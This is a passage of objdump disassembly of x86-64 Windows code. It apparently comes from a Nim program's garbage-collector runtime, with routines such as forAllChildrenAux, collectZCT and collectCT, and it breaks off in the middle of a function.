  4033ec:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4033f0:	0f b6 da             	movzbl %dl,%ebx
  4033f3:	89 da                	mov    %ebx,%edx
  4033f5:	e8 71 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033fa:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  4033fe:	89 da                	mov    %ebx,%edx
  403400:	48 83 c4 28          	add    $0x28,%rsp
  403404:	5b                   	pop    %rbx
  403405:	5e                   	pop    %rsi
  403406:	e9 60 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

000000000040340b <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_3>:
  40340b:	48 83 ec 28          	sub    $0x28,%rsp
  40340f:	e8 8c e8 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403414:	31 d2                	xor    %edx,%edx
  403416:	48 8b 88 78 34 00 00 	mov    0x3478(%rax),%rcx
  40341d:	48 83 c4 28          	add    $0x28,%rsp
  403421:	e9 45 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403426 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug>:
  403426:	57                   	push   %rdi
  403427:	56                   	push   %rsi
  403428:	53                   	push   %rbx
  403429:	48 83 ec 20          	sub    $0x20,%rsp
  40342d:	31 db                	xor    %ebx,%ebx
  40342f:	48 89 ce             	mov    %rcx,%rsi
  403432:	0f b6 fa             	movzbl %dl,%edi
  403435:	48 85 f6             	test   %rsi,%rsi
  403438:	74 1d                	je     403457 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug+0x31>
  40343a:	48 3b 1e             	cmp    (%rsi),%rbx
  40343d:	7d 18                	jge    403457 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug+0x31>
  40343f:	48 89 d8             	mov    %rbx,%rax
  403442:	89 fa                	mov    %edi,%edx
  403444:	48 ff c3             	inc    %rbx
  403447:	48 c1 e0 04          	shl    $0x4,%rax
  40344b:	48 8b 4c 06 18       	mov    0x18(%rsi,%rax,1),%rcx
  403450:	e8 16 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403455:	eb de                	jmp    403435 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug+0xf>
  403457:	48 83 c4 20          	add    $0x20,%rsp
  40345b:	5b                   	pop    %rbx
  40345c:	5e                   	pop    %rsi
  40345d:	5f                   	pop    %rdi
  40345e:	c3                   	ret

000000000040345f <TM__yu6cxgKBBXbNsTkT9cyMd4g_3>:
  40345f:	48 83 ec 28          	sub    $0x28,%rsp
  403463:	e8 38 e8 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403468:	31 d2                	xor    %edx,%edx
  40346a:	48 8b 88 60 34 00 00 	mov    0x3460(%rax),%rcx
  403471:	48 83 c4 28          	add    $0x28,%rsp
  403475:	e9 f1 fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

000000000040347a <TM__yu6cxgKBBXbNsTkT9cyMd4g_2>:
  40347a:	48 83 ec 28          	sub    $0x28,%rsp
  40347e:	e8 1d e8 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403483:	31 d2                	xor    %edx,%edx
  403485:	48 8b 88 58 34 00 00 	mov    0x3458(%rax),%rcx
  40348c:	48 83 c4 28          	add    $0x28,%rsp
  403490:	e9 d6 fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403495 <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ>:
  403495:	57                   	push   %rdi
  403496:	56                   	push   %rsi
  403497:	53                   	push   %rbx
  403498:	48 83 ec 20          	sub    $0x20,%rsp
  40349c:	31 db                	xor    %ebx,%ebx
  40349e:	48 89 ce             	mov    %rcx,%rsi
  4034a1:	0f b6 fa             	movzbl %dl,%edi
  4034a4:	48 85 f6             	test   %rsi,%rsi
  4034a7:	74 16                	je     4034bf <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ+0x2a>
  4034a9:	48 3b 1e             	cmp    (%rsi),%rbx
  4034ac:	7d 11                	jge    4034bf <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ+0x2a>
  4034ae:	48 8b 4c de 10       	mov    0x10(%rsi,%rbx,8),%rcx
  4034b3:	89 fa                	mov    %edi,%edx
  4034b5:	48 ff c3             	inc    %rbx
  4034b8:	e8 ae fc ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4034bd:	eb e5                	jmp    4034a4 <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ+0xf>
  4034bf:	48 83 c4 20          	add    $0x20,%rsp
  4034c3:	5b                   	pop    %rbx
  4034c4:	5e                   	pop    %rsi
  4034c5:	5f                   	pop    %rdi
  4034c6:	c3                   	ret

00000000004034c7 <TM__6NbDwwj5FY059b1gz2AsAZQ_5>:
  4034c7:	48 83 ec 28          	sub    $0x28,%rsp
  4034cb:	e8 d0 e7 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4034d0:	31 d2                	xor    %edx,%edx
  4034d2:	48 8b 88 48 34 00 00 	mov    0x3448(%rax),%rcx
  4034d9:	48 83 c4 28          	add    $0x28,%rsp
  4034dd:	e9 89 fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004034e2 <TM__6NbDwwj5FY059b1gz2AsAZQ_4>:
  4034e2:	48 83 ec 28          	sub    $0x28,%rsp
  4034e6:	e8 b5 e7 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4034eb:	31 d2                	xor    %edx,%edx
  4034ed:	48 8b 88 40 34 00 00 	mov    0x3440(%rax),%rcx
  4034f4:	48 83 c4 28          	add    $0x28,%rsp
  4034f8:	e9 6e fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004034fd <Marker_tyRef__9a5v4OQPlGqsA25ioN8hFYA>:
  4034fd:	56                   	push   %rsi
  4034fe:	53                   	push   %rbx
  4034ff:	48 83 ec 28          	sub    $0x28,%rsp
  403503:	48 89 ce             	mov    %rcx,%rsi
  403506:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40350a:	0f b6 da             	movzbl %dl,%ebx
  40350d:	89 da                	mov    %ebx,%edx
  40350f:	e8 57 fc ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403514:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403518:	89 da                	mov    %ebx,%edx
  40351a:	e8 4c fc ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40351f:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  403523:	89 da                	mov    %ebx,%edx
  403525:	48 83 c4 28          	add    $0x28,%rsp
  403529:	5b                   	pop    %rbx
  40352a:	5e                   	pop    %rsi
  40352b:	e9 3b fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>:
  403530:	41 55                	push   %r13
  403532:	41 54                	push   %r12
  403534:	55                   	push   %rbp
  403535:	57                   	push   %rdi
  403536:	56                   	push   %rsi
  403537:	53                   	push   %rbx
  403538:	48 83 ec 28          	sub    $0x28,%rsp
  40353c:	8a 02                	mov    (%rdx),%al
  40353e:	3c 02                	cmp    $0x2,%al
  403540:	48 89 cb             	mov    %rcx,%rbx
  403543:	48 89 d7             	mov    %rdx,%rdi
  403546:	74 30                	je     403578 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0x48>
  403548:	3c 03                	cmp    $0x3,%al
  40354a:	0f 84 99 00 00 00    	je     4035e9 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xb9>
  403550:	fe c8                	dec    %al
  403552:	0f 85 b6 00 00 00    	jne    40360e <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xde>
  403558:	48 03 5f 08          	add    0x8(%rdi),%rbx
  40355c:	45 0f b6 c0          	movzbl %r8b,%r8d
  403560:	48 8b 52 10          	mov    0x10(%rdx),%rdx
  403564:	48 89 d9             	mov    %rbx,%rcx
  403567:	48 83 c4 28          	add    $0x28,%rsp
  40356b:	5b                   	pop    %rbx
  40356c:	5e                   	pop    %rsi
  40356d:	5f                   	pop    %rdi
  40356e:	5d                   	pop    %rbp
  40356f:	41 5c                	pop    %r12
  403571:	41 5d                	pop    %r13
  403573:	e9 a3 00 00 00       	jmp    40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  403578:	48 8b 42 20          	mov    0x20(%rdx),%rax
  40357c:	41 0f b6 f0          	movzbl %r8b,%esi
  403580:	31 ed                	xor    %ebp,%ebp
  403582:	41 bd 00 00 40 11    	mov    $0x11400000,%r13d
  403588:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  40358c:	49 39 ec             	cmp    %rbp,%r12
  40358f:	7c 7d                	jl     40360e <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xde>
  403591:	48 8b 47 28          	mov    0x28(%rdi),%rax
  403595:	48 8b 04 e8          	mov    (%rax,%rbp,8),%rax
  403599:	80 38 01             	cmpb   $0x1,(%rax)
  40359c:	74 10                	je     4035ae <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0x7e>
  40359e:	41 89 f0             	mov    %esi,%r8d
  4035a1:	48 89 c2             	mov    %rax,%rdx
  4035a4:	48 89 d9             	mov    %rbx,%rcx
  4035a7:	e8 84 ff ff ff       	call   403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>
  4035ac:	eb 36                	jmp    4035e4 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xb4>
  4035ae:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4035b2:	4d 89 e9             	mov    %r13,%r9
  4035b5:	48 8b 50 10          	mov    0x10(%rax),%rdx
  4035b9:	48 01 d9             	add    %rbx,%rcx
  4035bc:	48 89 c8             	mov    %rcx,%rax
  4035bf:	8a 4a 08             	mov    0x8(%rdx),%cl
  4035c2:	49 d3 e9             	shr    %cl,%r9
  4035c5:	4c 89 c9             	mov    %r9,%rcx
  4035c8:	80 e1 01             	and    $0x1,%cl
  4035cb:	75 0d                	jne    4035da <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xaa>
  4035cd:	41 89 f0             	mov    %esi,%r8d
  4035d0:	48 89 c1             	mov    %rax,%rcx
  4035d3:	e8 43 00 00 00       	call   40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  4035d8:	eb 0a                	jmp    4035e4 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xb4>
  4035da:	48 8b 08             	mov    (%rax),%rcx
  4035dd:	89 f2                	mov    %esi,%edx
  4035df:	e8 87 fb ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4035e4:	48 ff c5             	inc    %rbp
  4035e7:	eb a3                	jmp    40358c <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0x5c>
  4035e9:	e8 b0 e0 ff ff       	call   40169e <selectBranch__2us2RQByTh81i9aW4EEgfmw>
  4035ee:	48 85 c0             	test   %rax,%rax
  4035f1:	74 1b                	je     40360e <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xde>
  4035f3:	45 0f b6 c0          	movzbl %r8b,%r8d
  4035f7:	48 89 c2             	mov    %rax,%rdx
  4035fa:	48 89 d9             	mov    %rbx,%rcx
  4035fd:	48 83 c4 28          	add    $0x28,%rsp
  403601:	5b                   	pop    %rbx
  403602:	5e                   	pop    %rsi
  403603:	5f                   	pop    %rdi
  403604:	5d                   	pop    %rbp
  403605:	41 5c                	pop    %r12
  403607:	41 5d                	pop    %r13
  403609:	e9 22 ff ff ff       	jmp    403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>
  40360e:	48 83 c4 28          	add    $0x28,%rsp
  403612:	5b                   	pop    %rbx
  403613:	5e                   	pop    %rsi
  403614:	5f                   	pop    %rdi
  403615:	5d                   	pop    %rbp
  403616:	41 5c                	pop    %r12
  403618:	41 5d                	pop    %r13
  40361a:	c3                   	ret

000000000040361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>:
  40361b:	41 54                	push   %r12
  40361d:	55                   	push   %rbp
  40361e:	57                   	push   %rdi
  40361f:	56                   	push   %rsi
  403620:	53                   	push   %rbx
  403621:	48 83 ec 20          	sub    $0x20,%rsp
  403625:	48 85 c9             	test   %rcx,%rcx
  403628:	49 89 cc             	mov    %rcx,%r12
  40362b:	48 89 d7             	mov    %rdx,%rdi
  40362e:	0f 84 9a 00 00 00    	je     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  403634:	f6 42 09 01          	testb  $0x1,0x9(%rdx)
  403638:	0f 85 90 00 00 00    	jne    4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  40363e:	8a 4a 08             	mov    0x8(%rdx),%cl
  403641:	80 f9 1c             	cmp    $0x1c,%cl
  403644:	0f 87 84 00 00 00    	ja     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  40364a:	b8 01 00 00 00       	mov    $0x1,%eax
  40364f:	48 d3 e0             	shl    %cl,%rax
  403652:	a9 10 00 01 08       	test   $0x8010010,%eax
  403657:	75 3f                	jne    403698 <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0x7d>
  403659:	a9 00 00 40 11       	test   $0x11400000,%eax
  40365e:	75 21                	jne    403681 <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0x66>
  403660:	a9 00 00 06 00       	test   $0x60000,%eax
  403665:	74 67                	je     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  403667:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  40366b:	45 0f b6 c0          	movzbl %r8b,%r8d
  40366f:	4c 89 e1             	mov    %r12,%rcx
  403672:	48 83 c4 20          	add    $0x20,%rsp
  403676:	5b                   	pop    %rbx
  403677:	5e                   	pop    %rsi
  403678:	5f                   	pop    %rdi
  403679:	5d                   	pop    %rbp
  40367a:	41 5c                	pop    %r12
  40367c:	e9 af fe ff ff       	jmp    403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>
  403681:	49 8b 0c 24          	mov    (%r12),%rcx
  403685:	41 0f b6 d0          	movzbl %r8b,%edx
  403689:	48 83 c4 20          	add    $0x20,%rsp
  40368d:	5b                   	pop    %rbx
  40368e:	5e                   	pop    %rsi
  40368f:	5f                   	pop    %rdi
  403690:	5d                   	pop    %rbp
  403691:	41 5c                	pop    %r12
  403693:	e9 d3 fa ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403698:	48 8b 02             	mov    (%rdx),%rax
  40369b:	41 0f b6 f0          	movzbl %r8b,%esi
  40369f:	31 ed                	xor    %ebp,%ebp
  4036a1:	48 8b 5a 10          	mov    0x10(%rdx),%rbx
  4036a5:	48 99                	cqto
  4036a7:	48 f7 3b             	idivq  (%rbx)
  4036aa:	48 8d 58 ff          	lea    -0x1(%rax),%rbx
  4036ae:	48 39 eb             	cmp    %rbp,%rbx
  4036b1:	7c 1b                	jl     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  4036b3:	48 8b 57 10          	mov    0x10(%rdi),%rdx
  4036b7:	41 89 f0             	mov    %esi,%r8d
  4036ba:	48 8b 0a             	mov    (%rdx),%rcx
  4036bd:	48 0f af cd          	imul   %rbp,%rcx
  4036c1:	48 ff c5             	inc    %rbp
  4036c4:	4c 01 e1             	add    %r12,%rcx
  4036c7:	e8 4f ff ff ff       	call   40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  4036cc:	eb e0                	jmp    4036ae <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0x93>
  4036ce:	48 83 c4 20          	add    $0x20,%rsp
  4036d2:	5b                   	pop    %rbx
  4036d3:	5e                   	pop    %rsi
  4036d4:	5f                   	pop    %rdi
  4036d5:	5d                   	pop    %rbp
  4036d6:	41 5c                	pop    %r12
  4036d8:	c3                   	ret

00000000004036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>:
  4036d9:	41 54                	push   %r12
  4036db:	55                   	push   %rbp
  4036dc:	57                   	push   %rdi
  4036dd:	56                   	push   %rsi
  4036de:	53                   	push   %rbx
  4036df:	48 83 ec 20          	sub    $0x20,%rsp
  4036e3:	48 89 cb             	mov    %rcx,%rbx
  4036e6:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4036ea:	41 89 d0             	mov    %edx,%r8d
  4036ed:	4c 8b 49 28          	mov    0x28(%rcx),%r9
  4036f1:	4d 85 c9             	test   %r9,%r9
  4036f4:	75 0f                	jne    403705 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x2c>
  4036f6:	8a 51 08             	mov    0x8(%rcx),%dl
  4036f9:	80 fa 16             	cmp    $0x16,%dl
  4036fc:	74 1b                	je     403719 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x40>
  4036fe:	80 fa 18             	cmp    $0x18,%dl
  403701:	74 31                	je     403734 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x5b>
  403703:	eb 6b                	jmp    403770 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x97>
  403705:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  403709:	0f b6 d2             	movzbl %dl,%edx
  40370c:	48 83 c4 20          	add    $0x20,%rsp
  403710:	5b                   	pop    %rbx
  403711:	5e                   	pop    %rsi
  403712:	5f                   	pop    %rdi
  403713:	5d                   	pop    %rbp
  403714:	41 5c                	pop    %r12
  403716:	49 ff e1             	rex.WB jmp *%r9
  403719:	48 8b 51 10          	mov    0x10(%rcx),%rdx
  40371d:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  403721:	45 0f b6 c0          	movzbl %r8b,%r8d
  403725:	48 83 c4 20          	add    $0x20,%rsp
  403729:	5b                   	pop    %rbx
  40372a:	5e                   	pop    %rsi
  40372b:	5f                   	pop    %rdi
  40372c:	5d                   	pop    %rbp
  40372d:	41 5c                	pop    %r12
  40372f:	e9 e7 fe ff ff       	jmp    40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  403734:	48 83 fb f0          	cmp    $0xfffffffffffffff0,%rbx
  403738:	74 36                	je     403770 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x97>
  40373a:	48 8b 7b 10          	mov    0x10(%rbx),%rdi
  40373e:	4c 8d 63 20          	lea    0x20(%rbx),%r12
  403742:	31 f6                	xor    %esi,%esi
  403744:	48 8d 6f ff          	lea    -0x1(%rdi),%rbp
  403748:	41 0f b6 f8          	movzbl %r8b,%edi
  40374c:	48 39 f5             	cmp    %rsi,%rbp
  40374f:	7c 1f                	jl     403770 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x97>
  403751:	48 8b 43 08          	mov    0x8(%rbx),%rax
  403755:	41 89 f8             	mov    %edi,%r8d
  403758:	48 8b 50 10          	mov    0x10(%rax),%rdx
  40375c:	48 8b 0a             	mov    (%rdx),%rcx
  40375f:	48 0f af ce          	imul   %rsi,%rcx
  403763:	48 ff c6             	inc    %rsi
  403766:	4c 01 e1             	add    %r12,%rcx
  403769:	e8 ad fe ff ff       	call   40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  40376e:	eb dc                	jmp    40374c <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x73>
  403770:	48 83 c4 20          	add    $0x20,%rsp
  403774:	5b                   	pop    %rbx
  403775:	5e                   	pop    %rsi
  403776:	5f                   	pop    %rdi
  403777:	5d                   	pop    %rbp
  403778:	41 5c                	pop    %r12
  40377a:	c3                   	ret

000000000040377b <collectZCT__EN6T32AMm3va9bsrdxtF0cg>:
  40377b:	57                   	push   %rdi
  40377c:	56                   	push   %rsi
  40377d:	53                   	push   %rbx
  40377e:	48 83 ec 20          	sub    $0x20,%rsp
  403782:	48 8d 79 68          	lea    0x68(%rcx),%rdi
  403786:	48 89 ce             	mov    %rcx,%rsi
  403789:	48 83 7e 18 00       	cmpq   $0x0,0x18(%rsi)
  40378e:	7e 46                	jle    4037d6 <collectZCT__EN6T32AMm3va9bsrdxtF0cg+0x5b>
  403790:	48 8b 56 28          	mov    0x28(%rsi),%rdx
  403794:	48 8b 1a             	mov    (%rdx),%rbx
  403797:	48 83 23 fb          	andq   $0xfffffffffffffffb,(%rbx)
  40379b:	48 8b 46 18          	mov    0x18(%rsi),%rax
  40379f:	48 8b 4c c2 f8       	mov    -0x8(%rdx,%rax,8),%rcx
  4037a4:	48 ff c8             	dec    %rax
  4037a7:	48 89 0a             	mov    %rcx,(%rdx)
  4037aa:	48 89 46 18          	mov    %rax,0x18(%rsi)
  4037ae:	48 83 3b 07          	cmpq   $0x7,(%rbx)
  4037b2:	77 d5                	ja     403789 <collectZCT__EN6T32AMm3va9bsrdxtF0cg+0xe>
  4037b4:	48 89 d9             	mov    %rbx,%rcx
  4037b7:	e8 9a e5 ff ff       	call   401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>
  4037bc:	48 89 d9             	mov    %rbx,%rcx
  4037bf:	ba 02 00 00 00       	mov    $0x2,%edx
  4037c4:	e8 10 ff ff ff       	call   4036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>
  4037c9:	48 89 da             	mov    %rbx,%rdx
  4037cc:	48 89 f9             	mov    %rdi,%rcx
  4037cf:	e8 40 ec ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  4037d4:	eb b3                	jmp    403789 <collectZCT__EN6T32AMm3va9bsrdxtF0cg+0xe>
  4037d6:	b0 01                	mov    $0x1,%al
  4037d8:	48 83 c4 20          	add    $0x20,%rsp
  4037dc:	5b                   	pop    %rbx
  4037dd:	5e                   	pop    %rsi
  4037de:	5f                   	pop    %rdi
  4037df:	c3                   	ret

00000000004037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>:
  4037e0:	41 57                	push   %r15
  4037e2:	41 56                	push   %r14
  4037e4:	41 55                	push   %r13
  4037e6:	41 54                	push   %r12
  4037e8:	55                   	push   %rbp
  4037e9:	57                   	push   %rdi
  4037ea:	56                   	push   %rsi
  4037eb:	53                   	push   %rbx
  4037ec:	48 83 ec 48          	sub    $0x48,%rsp
  4037f0:	48 8b 41 18          	mov    0x18(%rcx),%rax
  4037f4:	48 39 41 10          	cmp    %rax,0x10(%rcx)
  4037f8:	49 89 cd             	mov    %rcx,%r13
  4037fb:	7e 11                	jle    40380e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x2e>
  4037fd:	48 8b 81 00 29 00 00 	mov    0x2900(%rcx),%rax
  403804:	48 39 41 08          	cmp    %rax,0x8(%rcx)
  403808:	0f 8f 21 04 00 00    	jg     403c2f <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x44f>
  40380e:	49 83 7d 60 00       	cmpq   $0x0,0x60(%r13)
  403813:	0f 85 16 04 00 00    	jne    403c2f <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x44f>
  403819:	e8 71 e5 ff ff       	call   401d8f <stackSize__0yw8cp0rOgL8i0O5kzzb0g>
  40381e:	49 39 85 70 33 00 00 	cmp    %rax,0x3370(%r13)
  403825:	49 0f 4d 85 70 33 00 	cmovge 0x3370(%r13),%rax
  40382c:	00 
  40382d:	45 31 c9             	xor    %r9d,%r9d
  403830:	49 89 85 70 33 00 00 	mov    %rax,0x3370(%r13)
  403837:	49 8b 85 10 31 00 00 	mov    0x3110(%r13),%rax
  40383e:	48 89 c2             	mov    %rax,%rdx
  403841:	48 8b 0a             	mov    (%rdx),%rcx
  403844:	48 39 ca             	cmp    %rcx,%rdx
  403847:	75 0a                	jne    403853 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x73>
  403849:	4d 89 4d 68          	mov    %r9,0x68(%r13)
  40384d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  403851:	eb 11                	jmp    403864 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x84>
  403853:	4c 8b 4a 10          	mov    0x10(%rdx),%r9
  403857:	48 89 ca             	mov    %rcx,%rdx
  40385a:	eb e5                	jmp    403841 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x61>
  40385c:	48 8b 50 18          	mov    0x18(%rax),%rdx
  403860:	48 8b 40 08          	mov    0x8(%rax),%rax
  403864:	48 3b 00             	cmp    (%rax),%rax
  403867:	75 f3                	jne    40385c <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x7c>
  403869:	49 89 55 70          	mov    %rdx,0x70(%r13)
  40386d:	4c 89 e9             	mov    %r13,%rcx
  403870:	e8 08 f5 ff ff       	call   402d7d <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g>
  403875:	49 8b 45 30          	mov    0x30(%r13),%rax
  403879:	4c 89 e9             	mov    %r13,%rcx
  40387c:	49 39 85 78 33 00 00 	cmp    %rax,0x3378(%r13)
  403883:	49 0f 4d 85 78 33 00 	cmovge 0x3378(%r13),%rax
  40388a:	00 
  40388b:	49 ff 85 58 33 00 00 	incq   0x3358(%r13)
  403892:	49 89 85 78 33 00 00 	mov    %rax,0x3378(%r13)
  403899:	e8 dd fe ff ff       	call   40377b <collectZCT__EN6T32AMm3va9bsrdxtF0cg>
  40389e:	84 c0                	test   %al,%al
  4038a0:	0f 84 44 03 00 00    	je     403bea <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x40a>
  4038a6:	49 8b 45 08          	mov    0x8(%r13),%rax
  4038aa:	49 39 85 00 29 00 00 	cmp    %rax,0x2900(%r13)
  4038b1:	0f 8c 33 03 00 00    	jl     403bea <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x40a>
  4038b7:	49 8d ad d8 33 00 00 	lea    0x33d8(%r13),%rbp
  4038be:	48 89 e9             	mov    %rbp,%rcx
  4038c1:	ff 15 a5 49 04 00    	call   *0x449a5(%rip)        # 44826c <__imp_EnterCriticalSection>
  4038c7:	49 8b 9d c8 33 00 00 	mov    0x33c8(%r13),%rbx
  4038ce:	48 85 db             	test   %rbx,%rbx
  4038d1:	75 0b                	jne    4038de <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0xfe>
  4038d3:	48 89 e9             	mov    %rbp,%rcx
  4038d6:	ff 15 e0 49 04 00    	call   *0x449e0(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  4038dc:	eb 6b                	jmp    403949 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x169>
  4038de:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4038e2:	31 f6                	xor    %esi,%esi
  4038e4:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  4038e8:	48 39 f7             	cmp    %rsi,%rdi
  4038eb:	7d 05                	jge    4038f2 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x112>
  4038ed:	48 8b 1b             	mov    (%rbx),%rbx
  4038f0:	eb dc                	jmp    4038ce <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0xee>
  4038f2:	4c 8b 64 f3 10       	mov    0x10(%rbx,%rsi,8),%r12
  4038f7:	e8 a4 e3 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4038fc:	48 8b 90 e8 33 00 00 	mov    0x33e8(%rax),%rdx
  403903:	4c 8b 90 f8 33 00 00 	mov    0x33f8(%rax),%r10
  40390a:	49 8d 4c 24 f0       	lea    -0x10(%r12),%rcx
  40390f:	48 ff ca             	dec    %rdx
  403912:	49 89 d1             	mov    %rdx,%r9
  403915:	4d 85 c9             	test   %r9,%r9
  403918:	78 1d                	js     403937 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x157>
  40391a:	4b 3b 0c ca          	cmp    (%r10,%r9,8),%rcx
  40391e:	4f 8d 1c ca          	lea    (%r10,%r9,8),%r11
  403922:	74 05                	je     403929 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x149>
  403924:	49 ff c9             	dec    %r9
  403927:	eb ec                	jmp    403915 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x135>
  403929:	4d 8b 0c d2          	mov    (%r10,%rdx,8),%r9
  40392d:	4d 89 0b             	mov    %r9,(%r11)
  403930:	48 89 90 e8 33 00 00 	mov    %rdx,0x33e8(%rax)
  403937:	e8 55 f5 ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>
  40393c:	48 ff c6             	inc    %rsi
  40393f:	eb a7                	jmp    4038e8 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x108>
  403941:	4c 89 e9             	mov    %r13,%rcx
  403944:	e8 32 fe ff ff       	call   40377b <collectZCT__EN6T32AMm3va9bsrdxtF0cg>
  403949:	49 83 7d 18 00       	cmpq   $0x0,0x18(%r13)
  40394e:	7f f1                	jg     403941 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x161>
  403950:	49 8b 8d a0 33 00 00 	mov    0x33a0(%r13),%rcx
  403957:	49 8d 85 90 33 00 00 	lea    0x3390(%r13),%rax
  40395e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403963:	48 85 c9             	test   %rcx,%rcx
  403966:	75 6f                	jne    4039d7 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x1f7>
  403968:	49 8b 8d a8 33 00 00 	mov    0x33a8(%r13),%rcx
  40396f:	31 db                	xor    %ebx,%ebx
